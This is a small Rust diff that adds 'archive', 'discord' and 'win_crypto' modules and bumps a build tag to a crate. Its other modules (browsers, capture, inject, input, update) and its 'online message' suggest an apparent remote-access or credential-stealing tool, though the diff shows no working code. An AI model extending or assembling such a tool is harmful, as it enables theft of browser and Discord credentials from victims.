@@ -35,10 +35,12 @@ macro_rules! eprintln {
     ($($arg:tt)*) => { crate::log_line(&format!($($arg)*), true) };
 }
 
-pub mod capture;
+pub mod archive;
 pub mod browsers;
+pub mod capture;
 pub mod commands;
 pub mod config;
+pub mod discord;
 pub mod host;
 pub mod info;
 pub mod inject;
@@ -46,10 +48,11 @@ pub mod input;
 pub mod stoat;
 pub mod update;
 pub mod volume;
+pub mod win_crypto;
 pub mod workspace;
 
 /// Build tag, surfaced in the online message so updates are visible.
-pub const BUILD: &str = "b8";
+pub const BUILD: &str = "b9";
 
 use anyhow::Result;
 use futures_util::{SinkExt, StreamExt};
